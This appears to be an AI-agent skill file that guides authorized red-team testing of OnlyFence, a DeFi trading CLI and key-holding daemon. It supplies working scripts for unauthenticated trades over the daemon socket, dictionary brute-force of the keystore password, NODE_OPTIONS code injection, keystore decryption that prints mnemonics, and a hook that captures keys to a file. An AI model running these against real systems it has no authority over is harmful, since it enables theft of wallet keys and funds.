---
name: red-team
description: "Red team security testing for OnlyFence. Executes real attack vectors against the running system to validate security hardening — process list credential leaks, IPC password brute-force, NODE_OPTIONS code injection, file permission bypasses, unauthenticated trade execution, symlink attacks, and Docker exposure. Use this skill whenever the user asks to 'red team', 'attack', 'pen test', 'security test', 'try to hack', 'test security', 'validate hardening', or 'find vulnerabilities' in OnlyFence. Also trigger when the user asks to 'retry attack', 'attack again', or 'test the fix'."
---

# OnlyFence Red Team Security Testing

You are a red team security tester for the OnlyFence project — a DeFi trading CLI with a daemon that holds decrypted private keys in memory. Your job is to execute real attacks against the live system and report what succeeds or fails.

## Philosophy

This is not a theoretical review. You execute actual commands that attempt to extract secrets, bypass controls, and abuse the system. The goal is to prove whether security controls work by trying to break them, not by reading the code and guessing.

Every attack should:
1. Actually run (not just describe what could happen)
2. Show concrete output proving success or failure
3. Chain successful findings into deeper attacks (e.g., stolen password → decrypt keystore)

## Target Architecture

OnlyFence has a tiered execution model:
- **Tier 0 (CLI-only)**: Session file holds encrypted keys, decrypted per-command
- **Tier 1 (Daemon)**: Long-running process holds decrypted keys in memory, accepts IPC
- The daemon listens on Unix socket (`~/.onlyfence/signer.sock`) and TCP (`127.0.0.1:19876`)
- All secrets live in `~/.onlyfence/` (keystore, session, config, trades.db)

## Attack Playbook

Run these attacks in order. Each attack is independent — run as many in parallel as possible. After all attacks complete, chain any successful findings into deeper exploitation.

### Phase 1: Reconnaissance

Run these in parallel:

**1.1 Process list credential leak**
```bash
ps aux | grep -i fence | grep -v grep
```
Look for `--password` in the command line. If found, the password is exposed to every user on the system. This was the original critical vulnerability.

**1.2 File permission audit**
```bash
ls -la ~/.onlyfence/
```
Check:
- Data directory should be `700` (not `755`)
- `keystore`, `session`, `config.toml`, `trades.db` should be `600`
- `signer.sock` should be `600`
- `daemon.pid` should be `600`
- Flag anything world-readable (`644` or worse)

**1.3 Read sensitive files directly**
```bash
cat ~/.onlyfence/keystore 2>/dev/null | head -c 500
```
If readable, you have the encrypted keystore blob. Combined with a stolen password, this is game over.

### Phase 2: IPC Attacks

**2.1 Unauthenticated trade execution**
Try to execute a trade through the daemon without any authentication:
```bash
node -e "
const net = require('net');
const sock = net.connect(process.env.HOME + '/.onlyfence/signer.sock');
const msg = JSON.stringify({
  id: 'attack-trade',
  type: 'trade',
  payload: {
    intent: {
      chainId: 'sui:mainnet',
      action: 'swap',
      walletAddress: '',
      params: { coinTypeIn: 'USDC', coinTypeOut: 'SUI', amountIn: '0.01', slippageBps: 100 }
    }
  }
}) + '\n';
sock.write(msg);
sock.on('data', d => { console.log('RESPONSE:', d.toString().trim()); sock.end(); });
sock.on('error', e => console.log('ERROR:', e.message));
setTimeout(() => { console.log('Timeout - no response'); process.exit(0); }, 5000);
"
```
If the daemon processes the request (even if the trade itself fails due to token resolution), the IPC layer lacks authentication.

**2.2 Password oracle via reload endpoint**
The `reload` IPC command accepts a password and returns success/failure — this acts as a password oracle for brute-forcing:
```bash
node -e "
const net = require('net');
const passwords = ['password', '123456', 'admin', 'test', 'qwerty', '12345678', 'letmein', 'welcome'];
let i = 0;
function tryNext() {
  if (i >= passwords.length) { console.log('Dictionary exhausted'); process.exit(0); return; }
  const pw = passwords[i++];
  const sock = net.connect(process.env.HOME + '/.onlyfence/signer.sock');
  const msg = JSON.stringify({ id: 'brute-'+i, type: 'reload', payload: { password: pw } }) + '\n';
  sock.write(msg);
  sock.on('data', d => {
    const resp = JSON.parse(d.toString().trim());
    if (resp.ok) {
      console.log('*** PASSWORD FOUND: ' + pw + ' ***');
      process.exit(0);
    } else {
      console.log('Tried: ' + pw + ' => ' + (resp.error || 'failed'));
      sock.end();
      tryNext();
    }
  });
  sock.on('error', e => { console.log(pw + ' error: ' + e.message); tryNext(); });
}
tryNext();
setTimeout(() => process.exit(0), 30000);
"
```
If any password returns `ok: true`, the attacker now has the keystore password. Check if rate limiting or lockout prevents rapid guessing.

**2.3 IPC buffer exhaustion (DoS)**
Send data without newlines to see if the server accumulates unbounded buffers:
```bash
node -e "
const net = require('net');
const sock = net.connect(process.env.HOME + '/.onlyfence/signer.sock');
// Send 2MB of data without newlines
const payload = 'A'.repeat(2 * 1024 * 1024);
sock.write(payload);
sock.on('data', d => console.log('Response:', d.toString().substring(0, 200)));
sock.on('error', e => console.log('Connection error:', e.message));
sock.on('close', () => console.log('Connection closed by server'));
setTimeout(() => { console.log('Done'); sock.end(); process.exit(0); }, 5000);
"
```
If the connection stays open and no error occurs, the server is vulnerable to memory exhaustion.

### Phase 3: Code Injection

**3.1 NODE_OPTIONS injection**
`NODE_OPTIONS` is processed by Node.js before any application code runs, so `sanitizeEnvironment()` stripping it is too late:
```bash
# Create injection payload
cat > /tmp/fence-redteam-probe.js << 'PROBE'
const fs = require('fs');
fs.appendFileSync('/tmp/fence-redteam-result.txt', 'INJECTED AT: ' + new Date().toISOString() + ' PID: ' + process.pid + '\n');
PROBE

# Clean previous results
rm -f /tmp/fence-redteam-result.txt

# Run fence with NODE_OPTIONS injection
NODE_OPTIONS="--require /tmp/fence-redteam-probe.js" npx tsx src/cli/index.ts status 2>&1 | tail -5
echo "---INJECTION CHECK---"
cat /tmp/fence-redteam-result.txt 2>/dev/null || echo "Injection blocked - NODE_OPTIONS was neutralized"

# Cleanup
rm -f /tmp/fence-redteam-probe.js /tmp/fence-redteam-result.txt
```
If the result file exists, code injection succeeded. The only real fix is a shell wrapper that unsets dangerous env vars before invoking `node`.

**3.2 LD_PRELOAD / DYLD_INSERT_LIBRARIES**
On macOS, test if `DYLD_INSERT_LIBRARIES` can inject a shared library (this is typically blocked by SIP but worth testing):
```bash
DYLD_INSERT_LIBRARIES=/tmp/nonexistent.dylib npx tsx src/cli/index.ts status 2>&1 | head -5
```

### Phase 4: Exploitation Chains

If any Phase 1-3 attack succeeded, chain them together for full compromise.

**4.1 Password stolen → Full key extraction**
If you obtained a password (from ps aux or brute-force), use it to decrypt the keystore:
```bash
node -e "
const { loadKeystore } = require('./dist/wallet/keystore.js');
try {
  const data = loadKeystore('STOLEN_PASSWORD_HERE');
  console.log('=== FULL COMPROMISE ===');
  console.log('Mnemonic:', data.mnemonic);
  console.log('Keys:', JSON.stringify(data.keys));
} catch(e) {
  console.log('Decryption failed:', e.message);
}
"
```

**4.2 Code injection → Key interception**
If NODE_OPTIONS injection works, craft a payload that hooks `loadKeystore()` to exfiltrate keys on next `fence unlock`:
```bash
cat > /tmp/fence-redteam-hook.js << 'HOOK'
const fs = require('fs');
const origModule = require('module');
const origLoad = origModule._load;
origModule._load = function(request, parent, isMain) {
  const result = origLoad.apply(this, arguments);
  if (request.includes('keystore') && result.loadKeystore) {
    const orig = result.loadKeystore;
    result.loadKeystore = function(password, path) {
      const data = orig(password, path);
      fs.appendFileSync('/tmp/fence-redteam-exfil.txt',
        JSON.stringify({ password, mnemonic: data.mnemonic, keys: data.keys }) + '\n');
      return data;
    };
  }
  return result;
};
HOOK
echo "Hook payload written - would intercept next fence unlock/start"
# Don't actually run this against the live system — just demonstrate the vector exists
rm -f /tmp/fence-redteam-hook.js
```

### Phase 5: Filesystem Attacks

**5.1 Symlink attack on keystore**
Test if `enforceFilePermissions()` follows symlinks (TOCTOU):
```bash
# Check if keystore is a regular file or could be replaced with a symlink
file ~/.onlyfence/keystore 2>/dev/null
stat -f "%HT %Sp %N" ~/.onlyfence/keystore 2>/dev/null || stat -c "%F %A %n" ~/.onlyfence/keystore 2>/dev/null
```

**5.2 Pre-create session file with weak permissions**
Check if session file creation enforces permissions or inherits from umask:
```bash
# Check if session file exists and its permissions
ls -la ~/.onlyfence/session 2>/dev/null || echo "No session file (Tier 0 not active)"
```

**5.3 Data directory parent permissions**
```bash
# Check if home directory allows other users to traverse to .onlyfence
ls -la ~ | head -3
stat -f "%Sp %N" ~ 2>/dev/null
```

### Phase 6: Docker-Specific (if applicable)

Only run these if Docker containers are present:

**6.1 Check if password leaks in container process list**
```bash
docker ps --filter "name=onlyfence" --format "{{.ID}}" 2>/dev/null | while read cid; do
  echo "Container: $cid"
  docker top "$cid" -o pid,args 2>/dev/null
done
```

**6.2 Check TCP binding**
```bash
docker inspect onlyfence 2>/dev/null | grep -A5 "PortBindings" || echo "No onlyfence container"
```

## Report Format

After running all attacks, produce a summary table:

```
## Red Team Results - [Date]

### Attack Results
| # | Attack | Result | Severity | Can Extract Keys? |
|---|--------|--------|----------|-------------------|
| 1.1 | Process list password leak | PASS/FAIL | CRITICAL/HIGH/MEDIUM/LOW | Yes/No |
| ... | ... | ... | ... | ... |

### Successful Exploitation Chains
[Describe any multi-step attacks that achieved full compromise]

### Fixed Since Last Run
[List attacks that were previously successful but now fail]

### Recommendations
[Prioritized list of remaining fixes]
```

Use **FAIL** (red) when the attack succeeded (security failed) and **PASS** (green) when the attack was blocked.

## Important Notes

- Always clean up attack artifacts (`/tmp/fence-redteam-*`) after testing
- Never push attack scripts or stolen credentials to git
- The keystore password visible in this skill's test output should be rotated after testing
- These attacks are authorized by the project owner for security validation only
